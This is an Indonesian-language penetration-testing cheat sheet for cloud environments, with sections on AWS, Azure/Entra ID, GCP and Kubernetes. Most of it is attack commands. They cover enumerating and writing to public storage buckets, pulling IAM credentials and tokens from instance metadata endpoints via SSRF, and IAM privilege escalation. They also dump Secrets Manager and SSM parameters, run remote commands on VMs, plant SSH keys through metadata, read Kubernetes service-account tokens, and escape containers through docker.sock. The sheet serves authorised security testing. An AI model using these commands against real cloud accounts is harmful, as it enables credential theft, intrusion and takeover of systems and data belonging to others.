# CLOUD — AWS / Azure / GCP Pentest Reference

> Cloud beda dari on-prem: fokus di **identity/IAM, storage publik, metadata (IMDS), dan misconfig**.
> Sering entry via SSRF→metadata atau creds bocor. Enumerasi permission dulu, baru eskalasi.

## Daftar Isi
1. [Storage publik (S3/Blob/GCS)](#storage)
2. [Metadata / IMDS](#imds)
3. [AWS](#aws)
4. [Azure / Entra ID](#azure)
5. [GCP](#gcp)
6. [Containers & Kubernetes](#k8s)

---

<a name="storage"></a>
## 1. Storage Publik

```bash
# AWS S3
aws s3 ls s3://<bucket> --no-sign-request
aws s3 cp s3://<bucket>/file . --no-sign-request
curl https://<bucket>.s3.amazonaws.com/         # listing publik?
# Tebak nama: <org>, <org>-dev/prod/backup/assets/logs/static/uploads
# Writable? aws s3 cp evil s3://<bucket>/ --no-sign-request → defacement/supply-chain

# GCP Storage
gsutil ls gs://<bucket>
curl https://storage.googleapis.com/<bucket>/

# Azure Blob
curl "https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list"
# Enum: MicroBurst / Invoke-EnumerateAzureBlobs
```
Tools: `cloud_enum`, `s3scanner`, `Grayhat Warfare` (index bucket publik).

---

<a name="imds"></a>
## 2. Metadata / IMDS (via SSRF atau akses instance)

```
AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
AWS IMDSv2 (butuh token):
  TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
  curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
     (header: Metadata-Flavor: Google) → OAuth token
Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
       (header: Metadata:true) → JWT untuk ARM
```
Creds dari IMDS → set sbg env → enumerasi permission (di bawah).

---

<a name="aws"></a>
## 3. AWS

```bash
aws sts get-caller-identity                     # siapa aku?
# Enum permission tanpa bikin noise:
enumerate-iam --access-key ... --secret-key ...
# atau pmapper / Pacu (framework) / ScoutSuite (audit)
scout aws                                        # audit misconfig lengkap

# Eskalasi umum (IAM privesc):
#  iam:CreatePolicyVersion, iam:PassRole+ec2:RunInstances, lambda:*, iam:PutUserPolicy,
#  AttachUserPolicy → attach AdministratorAccess. (lihat "AWS IAM privesc" Rhino Labs)
# Lateral: assume-role antar akun, SSM SendCommand → RCE di EC2, Secrets Manager, SSM Parameter Store.
aws secretsmanager list-secrets; aws ssm get-parameters-by-path --path / --recursive --with-decryption
```

---

<a name="azure"></a>
## 4. Azure / Entra ID (Azure AD)

```bash
# Auth
az login                        # atau device code phish (in-scope)
az account show
# Enum
roadrecon auth ...; roadrecon gather   → dump seluruh tenant (users, apps, roles)
# atau AzureHound → BloodHound (edge Azure)
# ScoutSuite / MicroBurst untuk misconfig

# Vektor umum:
#  - Managed Identity (IMDS) → token ARM/Graph
#  - App registration secret bocor → service principal takeover
#  - Dynamic group / role assignment abuse
#  - Consent grant / illicit OAuth app
#  - Storage account key / SAS token bocor
#  - Automation Account / RunBook → RCE
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts "id"   # RCE jika punya rights
```

---

<a name="gcp"></a>
## 5. GCP

```bash
gcloud auth list; gcloud config list; gcloud projects list
# Token dari metadata → gcloud auth activate atau langsung API call
# Enum permission:
gcloud projects get-iam-policy <proj>
# Tools: GCPBucketBrute, ScoutSuite, hayat
# Eskalasi umum:
#  - serviceAccountUser + deploy (Cloud Functions/Run/Compute) run-as SA high priv
#  - iam.serviceAccounts.getAccessToken → impersonate SA
#  - Compute metadata SSH key add → login
gcloud compute instances add-metadata <vm> --metadata-from-file ssh-keys=key.pub
```

---

<a name="k8s"></a>
## 6. Containers & Kubernetes

```bash
# Di dalam container — cek escape:
cat /proc/1/cgroup; env | grep -i kube; ls -la /var/run/secrets/kubernetes.io/
# Privileged container / hostPath mount / docker.sock → escape ke host
ls -la /var/run/docker.sock && docker -H unix:///var/run/docker.sock ps  # → mount host /

# K8s API dari dalam pod (service account token):
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces/default/pods
kubectl auth can-i --list                         # permission SA
# Overpermissioned SA (create pod / exec / secrets) → cluster takeover
# Tools: kube-hunter, kubeaudit, peirates
```

**Container escape klasik:** privileged flag, `CAP_SYS_ADMIN`, host PID/net namespace, writable
`/var/run/docker.sock`, kernel exploit, `release_agent` cgroup escape.
